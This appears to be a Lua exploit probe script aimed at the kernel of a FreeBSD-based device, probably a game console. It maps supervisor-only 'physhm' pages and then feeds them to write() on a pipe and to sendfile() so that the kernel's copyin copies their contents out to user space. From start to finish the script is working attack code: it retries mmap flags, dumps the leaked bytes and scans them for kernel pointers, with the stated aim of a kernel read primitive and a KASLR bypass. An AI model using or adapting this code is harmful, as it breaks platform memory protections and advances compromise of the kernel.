-- CRASH_CLASS: MODERATE
-- PROBE 173a: Read physhm supervisor-only pages via kernel copyin
--
-- PR #89 (ng643): physhm_open(629) returns a descriptor, mmap succeeds
-- returning a user VA, but user-mode reads kill the process. The mapping
-- is supervisor-only (U/S=0 in PTE).
--
-- Key insight: copyin runs in ring 0. On x86-64, kernel mode can always
-- access pages with U/S=0 regardless of SMAP state (SMAP only restricts
-- access to U/S=1 pages). If we pass the physhm VA as a buffer to
-- write(pipe_fd, physhm_va, N), copyin should succeed and we can read
-- the physical shared memory contents via the pipe.
--
-- If this works, physhm may expose kernel data or physical memory,
-- giving us a kernel read primitive or KASLR defeat.

print("=== PROBE 173a: PHYSHM COPYIN LEAK ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- [A] Open physhm descriptor via syscall 629
print("")
print("--- [A] PHYSHM_OPEN (629) ---")

local ok_open, physhm_fd = pcall(native.fcall_with_rax, stub, 629,
    1, 2, 0, 0)
local fd = -1
if ok_open then
    fd = to_num(physhm_fd)
    print("physhm_open(1,2,0,0) fd=" .. fd)
else
    print("physhm_open FAILED: " .. tostring(physhm_fd))
end

if fd < 0 then
    -- Try alternate arg3 values
    for a3 = 1, 3 do
        ok_open, physhm_fd = pcall(native.fcall_with_rax, stub, 629,
            1, 2, 0, a3)
        if ok_open then
            fd = to_num(physhm_fd)
            if fd >= 0 then
                print("physhm_open(1,2,0," .. a3 .. ") fd=" .. fd)
                break
            end
        end
    end
end

if fd < 0 then
    print("FAILED to open physhm descriptor")
    print("=== DONE ===")
    return
end

-- [B] Create pipe for data extraction
print("")
print("--- [B] PIPE SETUP ---")
local ok_pipe, pipe_rv = pcall(native.fcall_with_rax, stub, 42)
local pipe_rd = -1
if ok_pipe then
    pipe_rd = to_num(pipe_rv)
    print("pipe rd=" .. pipe_rd .. " wr=" .. (pipe_rd + 1))
else
    print("pipe FAILED")
    print("=== DONE ===")
    return
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=" .. hex64(gpu))

-- [C] mmap the physhm fd at offset 0
print("")
print("--- [C] MMAP PHYSHM ---")
local PAGE = 0x4000

-- mmap(0, PAGE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0) = sys 477
local ok_mm, mm_rv = pcall(function()
    return sc_mmap(uint64(0), uint64(PAGE), uint64(3),
        uint64(1), uint64(fd), uint64(0))
end)
local mm_addr = nil
local mmh, mml = 0, 0
if ok_mm then
    mmh, mml = get_hi_lo(mm_rv)
    print("physhm mmap=" .. hex64(mm_rv))
    if mml == 0 and mmh == 0 then
        print("mmap returned NULL")
    else
        mm_addr = mm_rv
    end
else
    print("mmap FAILED: " .. tostring(mm_rv))
end

if not mm_addr then
    -- Try with PROT_READ only
    ok_mm, mm_rv = pcall(function()
        return sc_mmap(uint64(0), uint64(PAGE), uint64(1),
            uint64(1), uint64(fd), uint64(0))
    end)
    if ok_mm then
        mmh, mml = get_hi_lo(mm_rv)
        print("physhm mmap(RO)=" .. hex64(mm_rv))
        if mml ~= 0 or mmh ~= 0 then
            mm_addr = mm_rv
        end
    end
end

if not mm_addr then
    print("cannot mmap physhm, trying MAP_SHARED|MAP_ANON")
    ok_mm, mm_rv = pcall(function()
        return sc_mmap(uint64(0), uint64(PAGE), uint64(3),
            uint64(0x1001), uint64(fd), uint64(0))
    end)
    if ok_mm then
        mmh, mml = get_hi_lo(mm_rv)
        print("physhm mmap(SHARED|ANON)=" .. hex64(mm_rv))
        if mml ~= 0 or mmh ~= 0 then
            mm_addr = mm_rv
        end
    end
end

if not mm_addr then
    print("All mmap attempts failed")
    pcall(native.fcall_with_rax, stub, 6, pipe_rd)
    pcall(native.fcall_with_rax, stub, 6, pipe_rd + 1)
    pcall(native.fcall_with_rax, stub, 6, fd)
    print("=== DONE ===")
    return
end

-- [D] THE KEY TEST: write(pipe_wr, physhm_va, N) via kernel copyin
print("")
print("--- [D] COPYIN TEST: write(pipe, physhm_va) ---")
print("physhm_va=" .. hex64(mm_addr))

-- First drain any stale pipe data
for i = 1, 10 do
    pcall(native.fcall_with_rax, stub, 3, pipe_rd, ga(0x80000), 4096)
end

-- Try writing 16 bytes from physhm VA to pipe
-- write(pipe_wr, physhm_va, 16) = sys 4
local write_addr = uint64(string.format("0x%X%08X", mmh, mml))
local ok_wr, wr_rv = pcall(native.fcall_with_rax, stub, 4,
    pipe_rd + 1, write_addr, 16)

if ok_wr then
    local written = to_num(wr_rv)
    print("write(pipe, physhm, 16) = " .. written)

    if written > 0 then
        print(">>> COPYIN SUCCEEDED! READING PHYSHM DATA <<<")

        -- Read from pipe into GPU buffer
        local ok_rd, rd_rv = pcall(native.fcall_with_rax, stub, 3,
            pipe_rd, ga(0x90000), written)
        local bytes_read = ok_rd and to_num(rd_rv) or 0
        print("read from pipe: " .. bytes_read .. " bytes")

        if bytes_read > 0 then
            -- Dump the data
            local line = "  data:"
            for i = 0, math.min(bytes_read - 1, 15) do
                local b = to_num(memory.read_dword(gpu + 0x90000 + (i - i%4)))
                b = math.floor(b / (256 ^ (i % 4))) % 256
                line = line .. string.format(" %02X", b)
            end
            print(line)
        end

        -- Now try reading a full page
        print("")
        print("--- [E] FULL PAGE READ ---")
        -- Drain pipe
        for i = 1, 20 do
            pcall(native.fcall_with_rax, stub, 3, pipe_rd, ga(0x80000), 4096)
        end

        -- Write full page
        ok_wr, wr_rv = pcall(native.fcall_with_rax, stub, 4,
            pipe_rd + 1, write_addr, PAGE)
        written = ok_wr and to_num(wr_rv) or -1
        print("write(pipe, physhm, " .. PAGE .. ") = " .. written)

        if written > 0 then
            -- Read in chunks
            local total = 0
            local kptr_count = 0
            while total < written do
                local chunk = math.min(written - total, 4096)
                ok_rd, rd_rv = pcall(native.fcall_with_rax, stub, 3,
                    pipe_rd, ga(0x90000 + total), chunk)
                local got = ok_rd and to_num(rd_rv) or 0
                if got <= 0 then break end
                total = total + got
            end
            print("total read: " .. total .. " bytes")

            -- Scan for kernel pointers
            for off = 0, total - 8, 8 do
                local qval = memory.read_qword(gpu + 0x90000 + off)
                local qh, ql = get_hi_lo(qval)
                if qh >= 0xFFFF8000 and qh < 0xFFFFFFFF then
                    kptr_count = kptr_count + 1
                    if kptr_count <= 10 then
                        print("  *** KPTR +" .. string.format("%04X", off) ..
                            " = " .. hex64(qval) .. " ***")
                    end
                end
            end
            print("kernel pointers found: " .. kptr_count)

            -- Dump first 128 bytes
            print("first 128 bytes:")
            for row = 0, 7 do
                local line = string.format("  +%03X:", row * 16)
                for i = 0, 15 do
                    local off = row * 16 + i
                    if off < total then
                        local b = to_num(memory.read_dword(gpu + 0x90000 + (off - off%4)))
                        b = math.floor(b / (256 ^ (off % 4))) % 256
                        line = line .. string.format(" %02X", b)
                    end
                end
                print(line)
            end

            -- Dump qwords looking for interesting values
            print("non-zero qwords:")
            local nz_count = 0
            for off = 0, math.min(total - 8, PAGE - 8), 8 do
                local qval = memory.read_qword(gpu + 0x90000 + off)
                local qh, ql = get_hi_lo(qval)
                if qh ~= 0 or ql ~= 0 then
                    nz_count = nz_count + 1
                    if nz_count <= 20 then
                        print(string.format("  +%04X: %s", off, hex64(qval)))
                    end
                end
            end
            print("total non-zero qwords: " .. nz_count)
        end

        -- [F] Try different mmap offsets to access different physical pages
        print("")
        print("--- [F] MMAP AT DIFFERENT OFFSETS ---")
        for _, test_off in ipairs({0x4000, 0x8000, 0x10000, 0x100000}) do
            local ok_m2, m2_rv = pcall(function()
                return sc_mmap(uint64(0), uint64(PAGE), uint64(3),
                    uint64(1), uint64(fd), uint64(test_off))
            end)
            if ok_m2 then
                local m2h, m2l = get_hi_lo(m2_rv)
                if m2h ~= 0 or m2l ~= 0 then
                    local m2_addr = uint64(string.format("0x%X%08X", m2h, m2l))
                    -- Try copyin
                    local ok_w2, w2_rv = pcall(native.fcall_with_rax, stub, 4,
                        pipe_rd + 1, m2_addr, 8)
                    local w2 = ok_w2 and to_num(w2_rv) or -1

                    if w2 > 0 then
                        -- Read and check for kernel ptr
                        pcall(native.fcall_with_rax, stub, 3,
                            pipe_rd, ga(0xA0000), 8)
                        local qval = memory.read_qword(gpu + 0xA0000)
                        print(string.format("  off=0x%X: mmap=%s val=%s",
                            test_off, hex64(m2_rv), hex64(qval)))
                    else
                        print(string.format("  off=0x%X: mmap=%s write=%d",
                            test_off, hex64(m2_rv), w2))
                    end

                    pcall(function()
                        return make_syscall(73)(m2_addr, uint64(PAGE))
                    end)
                else
                    print(string.format("  off=0x%X: mmap=NULL", test_off))
                end
            else
                print(string.format("  off=0x%X: mmap FAIL", test_off))
            end
        end
    elseif written == 0 then
        print("write returned 0 — copyin rejected (EFAULT)")
    else
        -- written is negative or -1
        local rv_h, rv_l = get_hi_lo(wr_rv)
        print("write returned " .. written .. " h=" .. string.format("0x%X", rv_h))
        print("copyin FAILED — kernel rejects supervisor-only pages")
    end
else
    print("write PCALL-FAIL: " .. tostring(wr_rv))
    print("copyin may have killed the process")
end

-- [G] Alternative: sendfile from physhm fd to socket
print("")
print("--- [G] SENDFILE TEST ---")
-- Create a socket pair for sendfile target
local ok_sp, sp_rv = pcall(native.fcall_with_rax, stub, 135,
    1, 1, 0, ga(0xB0000))
local sp = ok_sp and to_num(sp_rv) or -1
print("socketpair=" .. sp)

if sp == 0 then
    local sp0 = to_num(memory.read_dword(gpu + 0xB0000))
    local sp1 = to_num(memory.read_dword(gpu + 0xB0004))
    print("  fds: " .. sp0 .. ", " .. sp1)

    -- sendfile(physhm_fd, socket, offset, nbytes, ...) = sys 393
    -- On FreeBSD: sendfile(fd, s, offset, nbytes, hdtr, sbytes, flags)
    local ok_sf, sf_rv = pcall(native.fcall_with_rax, stub, 393,
        fd, sp1, 0, PAGE, 0, ga(0xB0100), 0)
    local sf = ok_sf and to_num(sf_rv) or -1
    print("sendfile(physhm_fd, sock)=" .. sf)

    if sf == 0 then
        local sent = to_num(memory.read_qword(gpu + 0xB0100))
        print("  bytes sent: " .. sent)

        if sent > 0 then
            -- Read from other socket end
            local ok_recv, recv_rv = pcall(native.fcall_with_rax, stub, 3,
                sp0, ga(0xC0000), math.min(sent, 4096))
            local recvd = ok_recv and to_num(recv_rv) or -1
            print("  recv: " .. recvd .. " bytes")

            if recvd > 0 then
                -- Scan for kernel pointers
                for off = 0, recvd - 8, 8 do
                    local qval = memory.read_qword(gpu + 0xC0000 + off)
                    local qh, ql = get_hi_lo(qval)
                    if qh >= 0xFFFF8000 and qh < 0xFFFFFFFF then
                        print("  *** SENDFILE KPTR +" ..
                            string.format("%04X", off) .. " = " ..
                            hex64(qval) .. " ***")
                    end
                end
            end
        end
    end

    pcall(native.fcall_with_rax, stub, 6, sp0)
    pcall(native.fcall_with_rax, stub, 6, sp1)
end

-- Cleanup
pcall(native.fcall_with_rax, stub, 6, pipe_rd)
pcall(native.fcall_with_rax, stub, 6, pipe_rd + 1)
pcall(native.fcall_with_rax, stub, 6, fd)

print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
